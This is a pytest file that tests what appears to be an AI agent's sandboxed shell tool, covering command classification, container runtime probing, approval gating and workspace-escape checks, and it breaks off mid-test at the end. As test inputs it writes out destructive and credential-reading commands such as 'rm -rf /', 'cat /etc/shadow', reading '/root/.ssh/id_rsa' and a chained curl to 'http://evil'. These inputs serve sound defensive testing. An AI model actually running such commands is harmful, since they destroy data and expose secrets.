"""
test_shell.py

ROADMAP §7: tests for security/sandbox.py and tools/builtin/shell.py —
command classification, sandbox routing, Docker/subprocess/inert paths,
approval model, security hardening, and registry integration.

All tests run offline — subprocess and Docker are mocked.
"""

import os
import platform
import random
import shlex
import subprocess
from unittest.mock import MagicMock, patch

import pytest

import config
from security import protected_paths
from security.capability import (
    CONTAINED,
    UNAVAILABLE,
    UNCONTAINED,
    CommandProfile,
    auto_approved,
    validate_mode,
)
from security.sandbox import (
    _SHELL_METACHARACTERS,
    HOST_READ,
    INERT,
    SANDBOXED,
    SANDBOXED_NET,
    UNKNOWN,
    SandboxUnavailable,
    _escapes_workspace,
    _is_inert,
    _needs_network,
    _run_docker,
    _run_inert,
    _run_subprocess_fallback,
    _scrubbed_env,
    _venastine_readonly_mount,
    _within,
    classify_command,
    containment_for,
    detect_shell,
    is_docker_available,
    run_sandboxed,
)
from tests.conftest import set_posture
from tools.builtin.shell import _shell_approval_check, _shell_approval_notice

# Batch 39 builds command strings containing backslashes. Written as
# `chr(92)` and concatenated rather than as escapes in a literal, because
# `"cat \\/etc\\/passwd"` and `r"cat \/etc\/passwd"` are the same string
# and look like different ones -- and a test whose SUBJECT is a
# backslash must not be the place a reader has to count them.
BS = chr(92)


# ---------------------------------------------------------------------------
# ---- Fixture: suppress detect_shell subprocess probes ---------------------
# ---------------------------------------------------------------------------

@pytest.fixture(autouse=True)
def _static_shell(monkeypatch):
    """Prevent detect_shell() from spawning real subprocess probes
    during tests that don't explicitly test shell detection."""
    monkeypatch.setattr(config, "SHELL_BINARY", "/bin/bash")


# ===========================================================================
# ---- detect_shell ---------------------------------------------------------
# ===========================================================================

class TestDetectShell:

    def test_config_override(self, monkeypatch):
        monkeypatch.setattr(config, "SHELL_BINARY", "/usr/bin/zsh")
        assert detect_shell() == "/usr/bin/zsh"

    def test_auto_detect_linux(self, monkeypatch):
        monkeypatch.setattr(config, "SHELL_BINARY", "")
        monkeypatch.setattr(platform, "system", lambda: "Linux")
        assert detect_shell() == "bash"

    def test_auto_detect_windows(self, monkeypatch):
        monkeypatch.setattr(config, "SHELL_BINARY", "")
        monkeypatch.setattr(platform, "system", lambda: "Windows")
        with patch("security.sandbox.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0)
            result = detect_shell()
        assert result in ("pwsh", "powershell")


# ===========================================================================
# ---- is_docker_available --------------------------------------------------
# ===========================================================================

class TestDockerAvailable:
    """is_docker_available() answers from a probe memoised for the process
    (review f41), so each case has to reset it -- otherwise the first
    test's answer would be the only one any of them measured.

    ROADMAP_v3 §49 (SS22) moved the memo from an lru_cache on this function
    to `sandbox._runtime_probe`, which remembers WHICH runtime answered and
    why none did, so the reset is that module's."""

    @pytest.fixture(autouse=True)
    def _clear_probe_cache(self):
        from security import sandbox
        sandbox._reset_runtime_probe()
        yield
        sandbox._reset_runtime_probe()

    def test_docker_found(self):
        with patch("security.sandbox.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0)
            assert is_docker_available() is True

    def test_docker_not_found(self):
        with patch("security.sandbox.subprocess.run") as mock_run:
            mock_run.side_effect = FileNotFoundError()
            assert is_docker_available() is False

    def test_docker_timeout(self):
        with patch("security.sandbox.subprocess.run") as mock_run:
            mock_run.side_effect = subprocess.TimeoutExpired(cmd="docker", timeout=10)
            assert is_docker_available() is False

    def test_the_probe_runs_once_per_process(self):
        """The point of the cache: §18's headless filter calls
        approval_needed(name, {}) for every advertised tool on every
        schema build, and shell's approval_check reaches this -- roughly
        two `docker info` subprocesses per _run(), each up to 10s when
        the daemon is unresponsive."""
        with patch("security.sandbox.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0)
            is_docker_available()
            is_docker_available()
            is_docker_available()
            assert mock_run.call_count == 1


class TestTheContainerRuntime:
    """ROADMAP_v3 §49 (SS22-SS24). Docker first; Podman when Docker is not
    installed or does not answer; a Podman that cannot enforce the limits
    is not a runtime at all; and the CLI a route invokes is the one the
    probe found."""

    @pytest.fixture(autouse=True)
    def _fresh_probe(self):
        from security import sandbox
        sandbox._reset_runtime_probe()
        yield
        sandbox._reset_runtime_probe()

    @staticmethod
    def _info_json(rootless=True, cgroups="v2",
                   controllers=("cpu", "memory", "pids")):
        import json
        return json.dumps({"host": {
            "cgroupVersion": cgroups,
            "cgroupControllers": list(controllers),
            "security": {"rootless": rootless}}})

    @staticmethod
    def _runner(answers):
        """A subprocess.run stand-in that answers by (cli, plain|json).

        A key that is absent raises FileNotFoundError, which is what a CLI
        that is not installed does. The shape of the real outputs is from
        batch 93's measurement: Podman's plain `info` carries
        `buildahVersion`, Docker's does not.
        """
        calls = []

        def run(argv, **_kwargs):
            calls.append(list(argv))
            key = (argv[0], "json" if "--format" in argv else "plain")
            if key not in answers:
                raise FileNotFoundError(argv[0])
            returncode, stdout = answers[key]
            return subprocess.CompletedProcess(argv, returncode, stdout, "")

        run.calls = calls
        return run

    _PODMAN_PLAIN = (0, "host:\n  arch: amd64\n  buildahVersion: 1.42.0\n")
    _DOCKER_PLAIN = (0, "Client:\n Version: 28.0\nServer:\n Containers: 0\n")

    def _probe_with(self, answers):
        from security import sandbox
        run = self._runner(answers)
        with patch("security.sandbox.subprocess.run", side_effect=run):
            name = sandbox.container_runtime()
        return name, run.calls

    def test_docker_wins_whenever_it_answers(self):
        name, calls = self._probe_with({
            ("docker", "plain"): self._DOCKER_PLAIN,
            ("podman", "plain"): self._PODMAN_PLAIN,
            ("podman", "json"): (0, self._info_json())})
        assert name == "docker"
        assert not [c for c in calls if c[0] == "podman"], (
            "Podman is asked only when Docker cannot run a container")

    def test_podman_runs_the_sandbox_when_docker_is_not_installed(self):
        name, _ = self._probe_with({
            ("podman", "plain"): self._PODMAN_PLAIN,
            ("podman", "json"): (0, self._info_json())})
        assert name == "podman"

    def test_podman_runs_the_sandbox_when_dockers_daemon_does_not_answer(self):
        name, _ = self._probe_with({
            ("docker", "plain"): (1, "Cannot connect to the Docker daemon"),
            ("podman", "plain"): self._PODMAN_PLAIN,
            ("podman", "json"): (0, self._info_json())})
        assert name == "podman"

    def test_with_neither_there_is_no_runtime_and_the_reason_names_both(self):
        from security import sandbox
        name, _ = self._probe_with({})
        assert name is None
        with patch("security.sandbox.subprocess.run",
                   side_effect=AssertionError("must not probe again")):
            assert sandbox.is_docker_available() is False
        reason = sandbox._known_unavailable_reason()
        assert "Docker" in reason and "Podman" in reason

    @pytest.mark.parametrize("json_answer, said", [
        ((0, _info_json.__func__(cgroups="v1")), "cgroups v1"),
        ((0, _info_json.__func__(controllers=("cpu", "memory"))), "pids"),
        ((0, "not json at all"), "could not be read"),
        ((125, ""), "would not report"),
    ])
    def test_a_podman_that_cannot_enforce_the_limits_is_refused(
            self, json_answer, said, caplog):
        """SS24. Rootless Podman on cgroups v1 accepts `--memory` and
        ignores it, and one with a controller missing cannot bind that
        flag -- and a Podman whose setup cannot be READ is refused too,
        because not knowing whether the limits bind is not a reason to
        assume they do."""
        from security import sandbox
        with caplog.at_level("WARNING", logger="security.sandbox"):
            name, _ = self._probe_with({
                ("podman", "plain"): self._PODMAN_PLAIN,
                ("podman", "json"): json_answer})
            sandbox.container_runtime()
        assert name is None
        assert said in sandbox._known_unavailable_reason()
        warned = [r for r in caplog.records
                  if "No container runtime can run the sandbox" in r.message]
        assert len(warned) == 1, "a refusal is said once per process"

    def test_a_rootful_podman_is_trusted_on_either_cgroup_version(self):
        """Only ROOTLESS can fail: a rootful runtime owns the cgroup tree."""
        name, _ = self._probe_with({
            ("podman", "plain"): self._PODMAN_PLAIN,
            ("podman", "json"): (0, self._info_json(rootless=False,
                                                     cgroups="v1"))})
        assert name == "podman"

    @pytest.mark.parametrize("rootless_v1, expected", [(True, None),
                                                       (False, "docker")])
    def test_a_docker_that_is_really_podman_is_checked_as_podman(
            self, rootless_v1, expected):
        """The podman-docker shim answers `docker info` with Podman's own
        output. Without this the limit check would be skipped by NAME."""
        info = (self._info_json(cgroups="v1") if rootless_v1
                else self._info_json())
        name, _ = self._probe_with({
            ("docker", "plain"): self._PODMAN_PLAIN,
            ("docker", "json"): (0, info)})
        assert name == expected

    def test_the_podman_path_probes_once_per_process(self):
        from security import sandbox
        run = self._runner({("podman", "plain"): self._PODMAN_PLAIN,
                            ("podman", "json"): (0, self._info_json())})
        with patch("security.sandbox.subprocess.run", side_effect=run):
            for _ in range(3):
                assert sandbox.is_docker_available() is True
        assert [c[:2] for c in run.calls] == [
            ["docker", "info"], ["podman", "info"], ["podman", "info"]]

    def test_known_runtime_reads_the_probe_and_never_runs_it(self):
        """The route reads this, and a test that patched availability must
        not have real `docker`/`podman` subprocesses run under it -- CI's
        runners ship Podman, so the argv would change there."""
        from security import sandbox
        with patch("security.sandbox.subprocess.run",
                   side_effect=AssertionError("known_runtime probed")):
            assert sandbox.known_runtime() == "docker"
        self._probe_with({("podman", "plain"): self._PODMAN_PLAIN,
                          ("podman", "json"): (0, self._info_json())})
        assert sandbox.known_runtime() == "podman"

    def test_the_route_invokes_the_runtime_the_probe_found(
            self, monkeypatch, tmp_path):
        from security import sandbox
        monkeypatch.setattr(config, "INERT_COMMANDS", ["ls"])
        monkeypatch.setattr(sandbox, "_runtime_probe",
                            sandbox.RuntimeProbe("podman"))
        monkeypatch.setattr(sandbox, "_log_image_identity",
                            lambda runtime="docker": None)
        with patch("security.sandbox.subprocess.Popen") as popen:
            popen.return_value.communicate.return_value = ("", "")
            popen.return_value.returncode = 0
            result = run_sandboxed("python x.py", str(tmp_path),
                                   docker_available=True)
        assert popen.call_args[0][0][:2] == ["podman", "run"]
        assert result["ran_on"] == "container"

    def test_a_timed_out_podman_container_is_killed_by_podman(self):
        with patch("security.sandbox.subprocess.Popen") as popen, \
             patch("security.sandbox.subprocess.run") as run:
            popen.return_value.communicate.side_effect = (
                subprocess.TimeoutExpired(cmd="podman", timeout=60))
            run.return_value = MagicMock(returncode=0)
            _run_docker("sleep 999", "/tmp/ws", runtime="podman")
        kills = [c[0][0][:2] for c in run.call_args_list]
        assert kills == [["podman", "kill"]]

    def test_the_image_is_inspected_by_the_runtime_that_runs_it(self):
        """Docker and Podman keep separate image stores, so EP7's line has
        to ask the one that will run the container."""
        from security import sandbox
        sandbox._resolved_image_id.cache_clear()
        with patch("security.sandbox.subprocess.run") as run:
            run.return_value = MagicMock(returncode=0, stdout="sha256:1\n")
            sandbox._resolved_image_id("img", "podman")
        sandbox._resolved_image_id.cache_clear()
        assert run.call_args[0][0][:3] == ["podman", "image", "inspect"]

    def test_the_unavailable_message_carries_the_probes_reason(
            self, monkeypatch, tmp_path):
        from security import sandbox
        monkeypatch.setattr(config, "INERT_COMMANDS", ["ls"])
        set_posture(monkeypatch, allow_insecure_fallback=False)
        monkeypatch.setattr(sandbox, "_runtime_probe", sandbox.RuntimeProbe(
            None, "rootless Podman on cgroups v1 cannot enforce the "
                  "sandbox's memory, CPU and process limits", refused=True))
        with pytest.raises(SandboxUnavailable, match="cgroups v1"):
            run_sandboxed("python x.py", str(tmp_path),
                          docker_available=False)

    def test_the_approval_notice_names_the_runtime(self, monkeypatch):
        """Podman and Docker are different products, and the person
        approving a command is told which one isolates it."""
        from security import sandbox
        from tools.builtin import shell as shell_tool
        monkeypatch.setattr(sandbox, "_runtime_probe",
                            sandbox.RuntimeProbe("podman"))
        with patch("tools.builtin.shell.is_docker_available",
                   return_value=True):
            notice = shell_tool._shell_approval_notice(
                {"command": "python x.py"})
        assert "Runs in a Podman container" in notice

    def test_the_shipped_image_is_fully_qualified(self):
        """SS23. Measured: stock Ubuntu Podman resolved `python:3.13-slim`
        only through a `shortnames.conf` alias, with no search registries
        configured -- an alias another distro need not ship."""
        import yaml
        root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        with open(os.path.join(root, "config.yaml"), encoding="utf-8") as f:
            image = yaml.safe_load(f)["sandbox_docker_image"]
        assert image.startswith("docker.io/"), image


# ===========================================================================
# ---- _is_inert ------------------------------------------------------------
# ===========================================================================

class TestIsInert:

    def test_allowlist_match_no_metacharacters(self):
        assert _is_inert("ls -la") is True
        assert _is_inert("cat file.txt") is True
        assert _is_inert("grep -r pattern .") is True

    def test_not_in_allowlist(self):
        assert _is_inert("python script.py") is False
        assert _is_inert("rm -rf /") is False

    def test_find_and_sort_removed_from_allowlist(self):
        assert _is_inert("find . -name '*.py'") is False
        assert _is_inert("sort data.txt") is False

    def test_metacharacters_reject(self):
        assert _is_inert("ls; rm -rf /") is False
        assert _is_inert("cat file | grep x") is False
        assert _is_inert("echo $HOME") is False
        assert _is_inert("ls > out.txt") is False

    def test_path_qualified_binary_rejected(self):
        """Attacker-planted ./ls or /workspace/ls must NOT be inert."""
        assert _is_inert("./ls") is False
        assert _is_inert("/workspace/ls") is False
        assert _is_inert("/tmp/cat file.txt") is False
        assert _is_inert(".\\ls") is False

    def test_dangerous_flags_rejected(self):
        """Even if a command were in the allowlist, dangerous flags
        would be caught by the denylist."""
        # find is no longer in INERT_COMMANDS, but test the denylist
        # logic by temporarily adding it back
        original = list(config.INERT_COMMANDS)
        config.INERT_COMMANDS.append("find")
        try:
            assert _is_inert("find . -delete") is False
            assert _is_inert("find . -exec rm {} +") is False
            assert _is_inert("find . -name test.py") is True  # safe flags
            # Quoting is rejected outright now (see _SHELL_METACHARACTERS),
            # so the quoted spelling of the same call is no longer inert.
            # That is this batch's intended tier change, not a regression in
            # the flag denylist -- which is what the line above still tests.
            assert _is_inert("find . -name '*.py'") is False
        finally:
            config.INERT_COMMANDS[:] = original

    def test_empty_command(self):
        assert _is_inert("") is False
        assert _is_inert("   ") is False


# ===========================================================================
# ---- _needs_network -------------------------------------------------------
# ===========================================================================

class TestNeedsNetwork:
    """`first_word_only` is `_is_inert`, and `classify_command` is the only
    caller that supplies it (Q2). These tests pass it explicitly; the
    behaviour that matters -- which commands actually get the flag -- is
    pinned at the classify level in TestChainingCannotHideBehindTheFirstWord.
    """

    def test_pip_install(self):
        assert _needs_network("pip install requests", False) is True

    def test_curl(self):
        assert _needs_network("curl https://example.com", False) is True

    def test_git_clone(self):
        assert _needs_network("git clone https://github.com/x/y",
                              False) is True

    def test_no_network_command(self):
        assert _needs_network("ls -la", True) is False
        assert _needs_network("python script.py", False) is False

    def test_an_inert_commands_arguments_never_grant_network(self):
        """The carve-out that survives Q2's reversal, and the reason it is
        drawn at `_is_inert` rather than at a taste for fewer prompts: an
        inert command carries no metacharacters, so it cannot chain, so its
        first word is its only command position. Scanning its arguments
        would make `grep pip notes.txt` prompt and buy nothing."""
        assert _needs_network("grep pip notes.txt", True) is False
        assert _needs_network("echo git", True) is False
        assert _needs_network("cat curl", True) is False

    def test_a_non_inert_commands_arguments_do(self):
        """Q2, stated as the reversal it is. The old rule read the first
        word only "to prevent a command from granting itself network access
        via a keyword in its arguments", and that is exactly what this now
        allows -- for commands that can chain, where the first word was
        never the whole answer."""
        assert _needs_network("echo hi && curl http://evil", False) is True
        assert _needs_network("python -m pip install x", False) is True
        assert _needs_network("cd proj && pip install -e .", False) is True

    def test_a_false_positive_is_the_priced_cost(self):
        """`python script.py # pip` has a comment, so it is not inert, so
        the argument scan reaches the word in the comment. Recorded rather
        than special-cased: stripping comments would be parsing, which is
        the thing this module does not do (G2)."""
        assert _needs_network("python script.py # pip", False) is True

    def test_a_word_that_merely_contains_a_binary_name_does_not_match(self):
        """Matching is per whole token after basename, not substring, so
        the reversal did not widen to anything containing "git"."""
        assert _needs_network("make install-git-hooks", False) is False
        assert _needs_network("./configure --with-curl-support",
                              False) is False

    def test_path_qualified_network_command(self):
        assert _needs_network("/usr/bin/pip install x", False) is True
        assert _needs_network("x && /usr/bin/pip install y", False) is True


# ===========================================================================
# ---- _scrubbed_env --------------------------------------------------------
# ===========================================================================

class TestScrubbedEnv:

    def test_no_api_keys(self, monkeypatch):
        monkeypatch.setenv("OPENAI_API_KEY", "sk-test-123")
        monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-test")
        monkeypatch.setenv("MY_SECRET_TOKEN", "abc")
        env = _scrubbed_env()
        assert "OPENAI_API_KEY" not in env
        assert "ANTHROPIC_API_KEY" not in env
        assert "MY_SECRET_TOKEN" not in env

    def test_safe_keys_present(self, monkeypatch):
        monkeypatch.setenv("PATH", "/usr/bin")
        monkeypatch.setenv("HOME", "/home/user")
        env = _scrubbed_env()
        assert "PATH" in env
        assert "HOME" in env


# ===========================================================================
# ---- Backend internals ----------------------------------------------------
# ===========================================================================

class TestBackendInternals:

    def test_run_inert_timeout(self):
        with patch("security.sandbox.subprocess.run") as mock_run:
            mock_run.side_effect = subprocess.TimeoutExpired(cmd="ls", timeout=60)
            result = _run_inert("ls", "/tmp/ws")
        assert result["return_code"] == -1
        assert "timed out" in result["stderr"]

    def test_run_inert_file_not_found(self):
        with patch("security.sandbox.subprocess.run") as mock_run:
            mock_run.side_effect = FileNotFoundError("no such file")
            result = _run_inert("nonexistent", "/tmp/ws")
        assert result["return_code"] == -1
        assert "not found" in result["stderr"].lower()

    def test_run_inert_truncates_output(self, monkeypatch):
        monkeypatch.setattr(config, "MAX_READ_CHARS", 10)
        with patch("security.sandbox.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(
                stdout="A" * 100, stderr="B" * 100, returncode=0,
            )
            result = _run_inert("ls", "/tmp/ws")
        assert len(result["stdout"]) == 10
        assert len(result["stderr"]) == 10

    def test_run_docker_network_none(self):
        """Verify --network none is passed when network=False."""
        with patch("security.sandbox.subprocess.Popen") as mock_popen:
            mock_proc = MagicMock()
            mock_proc.communicate.return_value = ("out", "err")
            mock_proc.returncode = 0
            mock_popen.return_value = mock_proc
            _run_docker("ls", "/tmp/ws", network=False)
        args = mock_popen.call_args[0][0]
        assert "--network" in args
        assert args[args.index("--network") + 1] == "none"

    def test_run_docker_network_allowed(self):
        """Verify --network none is NOT passed when network=True."""
        with patch("security.sandbox.subprocess.Popen") as mock_popen:
            mock_proc = MagicMock()
            mock_proc.communicate.return_value = ("out", "err")
            mock_proc.returncode = 0
            mock_popen.return_value = mock_proc
            _run_docker("pip install x", "/tmp/ws", network=True)
        args = mock_popen.call_args[0][0]
        assert "--network" not in args

    def test_run_docker_timeout_kills_container(self):
        """On timeout, docker kill must be called to stop the container."""
        with patch("security.sandbox.subprocess.Popen") as mock_popen, \
             patch("security.sandbox.subprocess.run") as mock_run:
            mock_proc = MagicMock()
            mock_proc.communicate.side_effect = subprocess.TimeoutExpired(
                cmd="docker", timeout=60,
            )
            mock_popen.return_value = mock_proc
            mock_run.return_value = MagicMock(returncode=0)
            result = _run_docker("sleep 999", "/tmp/ws")
        assert result["return_code"] == -1
        # docker kill should have been called
        kill_calls = [c for c in mock_run.call_args_list
                      if c[0][0][:2] == ["docker", "kill"]]
        assert len(kill_calls) == 1

    def test_run_subprocess_fallback_timeout(self):
        with patch("security.sandbox.subprocess.run") as mock_run:
            mock_run.side_effect = subprocess.TimeoutExpired(cmd="bash", timeout=60)
            result = _run_subprocess_fallback("sleep 999", "/tmp/ws", "bash")
        assert result["return_code"] == -1
        assert "timed out" in result["stderr"]

    def test_run_subprocess_fallback_shell_not_found(self):
        with patch("security.sandbox.subprocess.run") as mock_run:
            mock_run.side_effect = FileNotFoundError("no bash")
            result = _run_subprocess_fallback("ls", "/tmp/ws", "bash")
        assert result["return_code"] == -1
        assert "not found" in result["stderr"].lower()


# ===========================================================================
# ---- run_sandboxed routing ------------------------------------------------
# ===========================================================================

class TestRunSandboxedRouting:
    """§28: these pass a REAL directory rather than the literal "/tmp/ws"
    they used to. run_sandboxed now creates its workspace (audit #50), so
    a made-up path would be a filesystem side effect outside the repo --
    on Windows the old literal produced a real C:/tmp/ws, which the suite
    then left behind. tmp_path is per-test and torn down."""

    @pytest.fixture
    def ws(self, tmp_path):
        return str(tmp_path)

    def test_inert_runs_in_the_container_when_there_is_one(self, monkeypatch,
                                                           ws):
        """§46 (EP5). The light path was a HOST subprocess resolving its
        binary off the host PATH -- and on Windows `ls`/`cat`/`grep`
        have no native binary at all, so it ran whichever POSIX
        toolchain some other product had put there. Every argument of an
        INERT command is inside the workspace, and the workspace is what
        the container mounts, so the tier the gate AUTO-APPROVES is the
        one that can run in the pinned image instead."""
        monkeypatch.setattr(config, "INERT_COMMANDS", ["ls", "cat"])
        with patch("security.sandbox._run_docker") as mock_docker, \
             patch("security.sandbox._log_image_identity"):
            mock_docker.return_value = {"stdout": "ok", "stderr": "",
                                        "return_code": 0}
            result = run_sandboxed("ls -la", ws, docker_available=True)
        mock_docker.assert_called_once()
        assert mock_docker.call_args.kwargs["argv"] is True, (
            "an inert command was handed to `bash -c`, which puts a third "
            "tokeniser between the classifier and the executor -- the gap "
            "#157 arrived through twice")
        assert result["ran_on"] == "container"
        assert result["tier"] == INERT

    def test_inert_falls_back_to_the_light_path_without_docker(
            self, monkeypatch, ws):
        """And SAYS so. The approval answer is the same either way (see
        containment_for), so the fallback is not a gate change -- but
        the model is told, because "host" is what it must not assume."""
        monkeypatch.setattr(config, "INERT_COMMANDS", ["ls", "cat"])
        with patch("security.sandbox._run_inert") as mock_inert:
            mock_inert.return_value = {"stdout": "ok", "stderr": "",
                                       "return_code": 0}
            result = run_sandboxed("ls -la", ws, docker_available=False)
        mock_inert.assert_called_once()
        assert result["stdout"] == "ok"
        assert result["ran_on"] == "host"
        assert result["tier"] == INERT

    def test_a_host_read_always_takes_the_light_path(self, monkeypatch, ws):
        """It names a file outside the workspace, so there is nothing
        else it could take -- Docker being up is irrelevant."""
        monkeypatch.setattr(config, "INERT_COMMANDS", ["ls", "cat"])
        with patch("security.sandbox._run_inert") as mock_inert, \
             patch("security.sandbox._run_docker") as mock_docker:
            mock_inert.return_value = {"stdout": "ok", "stderr": "",
                                       "return_code": 0}
            result = run_sandboxed("cat /etc/shadow", ws,
                                   docker_available=True)
        mock_inert.assert_called_once()
        mock_docker.assert_not_called()
        assert result["ran_on"] == "host"
        assert result["tier"] == HOST_READ

    def test_non_inert_docker_available(self, monkeypatch, ws):
        monkeypatch.setattr(config, "INERT_COMMANDS", ["ls"])
        with patch("security.sandbox.is_docker_available", return_value=True), \
             patch("security.sandbox._run_docker") as mock_docker:
            mock_docker.return_value = {"stdout": "docker", "stderr": "", "return_code": 0}
            result = run_sandboxed("python script.py", ws)
        mock_docker.assert_called_once()
        assert result["stdout"] == "docker"

    def test_non_inert_no_docker_fallback_enabled(self, monkeypatch, ws):
        monkeypatch.setattr(config, "INERT_COMMANDS", ["ls"])
        set_posture(monkeypatch, allow_insecure_fallback=True)
        with patch("security.sandbox.is_docker_available", return_value=False), \
             patch("security.sandbox._run_subprocess_fallback") as mock_fb:
            mock_fb.return_value = {"stdout": "fb", "stderr": "", "return_code": 0}
            result = run_sandboxed("python script.py", ws)
        mock_fb.assert_called_once()
        assert result["stdout"] == "fb"

    def test_non_inert_no_docker_fallback_disabled_raises(self, monkeypatch, ws):
        monkeypatch.setattr(config, "INERT_COMMANDS", ["ls"])
        set_posture(monkeypatch, allow_insecure_fallback=False)
        with patch("security.sandbox.is_docker_available", return_value=False):
            with pytest.raises(SandboxUnavailable, match="No container runtime"):
                run_sandboxed("python script.py", ws)

    def test_docker_available_param_overrides_probe(self, monkeypatch, ws):
        """When docker_available is passed explicitly, is_docker_available
        must NOT be called (TOCTOU fix)."""
        monkeypatch.setattr(config, "INERT_COMMANDS", ["ls"])
        with patch("security.sandbox.is_docker_available") as mock_probe, \
             patch("security.sandbox._run_docker") as mock_docker:
            mock_docker.return_value = {"stdout": "", "stderr": "", "return_code": 0}
            run_sandboxed("python x.py", ws, docker_available=True)
        mock_probe.assert_not_called()
        mock_docker.assert_called_once()

    def test_network_false_passed_to_docker(self, monkeypatch, ws):
        monkeypatch.setattr(config, "INERT_COMMANDS", ["ls"])
        with patch("security.sandbox.is_docker_available", return_value=True), \
             patch("security.sandbox._run_docker") as mock_docker:
            mock_docker.return_value = {"stdout": "", "stderr": "", "return_code": 0}
            run_sandboxed("python script.py", ws)
        # network should be False for a non-network command
        assert mock_docker.call_args[0][3] is False or mock_docker.call_args[1].get("network") is False

    def test_network_true_for_pip(self, monkeypatch, ws):
        monkeypatch.setattr(config, "INERT_COMMANDS", ["ls"])
        with patch("security.sandbox.is_docker_available", return_value=True), \
             patch("security.sandbox._run_docker") as mock_docker:
            mock_docker.return_value = {"stdout": "", "stderr": "", "return_code": 0}
            run_sandboxed("pip install requests", ws)
        assert mock_docker.call_args[0][3] is True or mock_docker.call_args[1].get("network") is True


# ===========================================================================
# ---- _shell_approval_check ------------------------------------------------
# ===========================================================================

class TestShellApprovalCheck:

    def test_base_approval_true(self, monkeypatch):
        set_posture(monkeypatch, shell_approval_mode="always")
        assert _shell_approval_check("shell", {"command": "ls"}) is True

    def test_inert_no_approval(self, monkeypatch):
        monkeypatch.setattr(config, "INERT_COMMANDS", ["ls", "cat"])
        assert _shell_approval_check("shell", {"command": "ls -la"}) is False

    def test_docker_code_asks_under_tiered(self, monkeypatch):
        """§48 (CE1). This was `test_docker_no_approval`, pinning that a
        contained command ran unasked in the shipped posture. It no longer
        does: it may run code. The old answer is the `contained` mode's,
        pinned directly below."""
        monkeypatch.setattr(config, "INERT_COMMANDS", ["ls"])
        with patch("tools.builtin.shell.is_docker_available", return_value=True):
            assert _shell_approval_check("shell", {"command": "python x.py"}) is True

    def test_docker_no_approval_under_contained(self, monkeypatch):
        monkeypatch.setattr(config, "INERT_COMMANDS", ["ls"])
        set_posture(monkeypatch, shell_approval_mode="contained")
        with patch("tools.builtin.shell.is_docker_available", return_value=True):
            assert _shell_approval_check("shell", {"command": "python x.py"}) is False

    def test_fallback_no_auto_approve_requires_approval(self, monkeypatch):
        monkeypatch.setattr(config, "INERT_COMMANDS", ["ls"])
        set_posture(monkeypatch, allow_insecure_fallback=True)
        set_posture(monkeypatch, auto_approve_fallback=False)
        with patch("tools.builtin.shell.is_docker_available", return_value=False):
            assert _shell_approval_check("shell", {"command": "python x.py"}) is True

    def test_fallback_auto_approve_no_approval(self, monkeypatch):
        monkeypatch.setattr(config, "INERT_COMMANDS", ["ls"])
        set_posture(monkeypatch, allow_insecure_fallback=True)
        set_posture(monkeypatch, auto_approve_fallback=True)
        with patch("tools.builtin.shell.is_docker_available", return_value=False):
            assert _shell_approval_check("shell", {"command": "python x.py"}) is False


# ===========================================================================
# ---- Registry integration -------------------------------------------------
# ===========================================================================

class TestRegistryIntegration:

    def test_shell_registered(self):
        from tools.registry import registry
        assert "shell" in registry._tools

    def test_shell_has_approval_check(self):
        from tools.registry import registry
        spec = registry._tools["shell"]
        assert spec.approval_check is not None

    def test_shell_schema_has_command_field(self):
        from tools.registry import registry
        schema = registry._tools["shell"].schema
        assert "command" in schema["input_schema"]["properties"]


# ===========================================================================
# ---- ROADMAP_v2 §28: the classifier and the gate --------------------------
# ===========================================================================


@pytest.fixture
def _tiered(monkeypatch, tmp_path):
    """Shipped §28 posture, with a real empty workspace to measure against.

    The mode is the gate and the ONLY gate: `tool_approvals` deliberately
    has no `shell` key, so there is no stub to set back. Tests that want
    shell gated set the posture to `always` explicitly.
    """
    set_posture(monkeypatch, shell_approval_mode="tiered")
    monkeypatch.setattr(config, "WORKSPACE_DIR", str(tmp_path))
    return str(tmp_path)


def _asks(command, docker=True):
    with patch("tools.builtin.shell.is_docker_available", return_value=docker):
        return _shell_approval_check("shell", {"command": command})


class TestTheArgumentRuleNeverParses:
    """#157 hole 1: `_is_inert` inspected only the first word, so every
    argument was unconstrained on a path that runs on the HOST."""

    def test_an_inert_command_reading_outside_the_workspace_is_asked_about(
            self, _tiered):
        # THE issue's own examples. Read-only, no metacharacters, not
        # path-qualified -- everything the pre-§28 check looked at said
        # harmless, and the file comes back to a model writing a report.
        assert _asks("cat /etc/shadow") is True
        assert _asks("grep -r sk-ant /") is True
        assert _asks("stat /root/.ssh/id_rsa") is True

    def test_the_same_commands_inside_the_workspace_are_not(self, _tiered):
        assert _asks("cat notes.txt") is False
        assert _asks("grep -r sk-ant .") is False
        assert _asks("ls -la") is False

    def test_a_relative_escape_is_caught_too(self, _tiered):
        assert _asks("cat ../../../etc/passwd") is True

    def test_a_flag_is_not_recognised_as_a_flag_it_just_lands_inside(
            self, _tiered):
        """The rule's soundness argument: nothing here knows what a flag
        is. `-la` passes because joining it to the workspace stays inside
        the workspace, which is also why `--file=/etc/x` must be split."""
        assert _within(_tiered, "-la") is True
        assert _within(_tiered, "--color=always") is True
        assert _within(_tiered, "/etc/shadow") is False

    def test_a_path_hidden_after_an_equals_sign_is_caught(self, _tiered):
        """`--file=/etc/x` reads as INSIDE the workspace when taken whole
        -- os.path.join produces a path under the root -- while the path
        it actually names is not. Deleting the `=` clause reopens hole 1
        for every flag that takes a path by assignment."""
        assert _within(_tiered, "--file=/etc/x") is True     # the whole token
        assert _escapes_workspace("grep --file=/etc/x n.txt", _tiered) is True
        assert _asks("grep --file=/etc/x notes.txt") is True

    def test_a_posix_absolute_path_escapes_on_every_platform(self, _tiered):
        assert _escapes_workspace("cat /etc/shadow", _tiered) is True
        assert _escapes_workspace("cat /", _tiered) is True

    @pytest.mark.skipif(platform.system() != "Windows",
                        reason="drive letters and UNC paths are Windows path "
                               "syntax; elsewhere they are ordinary relative "
                               "names and land inside the workspace, which is "
                               "the correct answer there")
    def test_a_windows_drive_and_a_unc_path_escape_on_windows(self, _tiered):
        """Platform-split rather than asserted everywhere, because the
        Linux container proved the combined version wrong: os.path.join
        on POSIX treats "C:/Users/x" as a relative directory named "C:",
        so it stays inside the workspace -- and it SHOULD, since it names
        nothing outside it there. The escape is real only where the
        syntax is."""
        assert _escapes_workspace(
            "cat C:/Users/x/.aws/credentials", _tiered) is True
        assert _escapes_workspace(
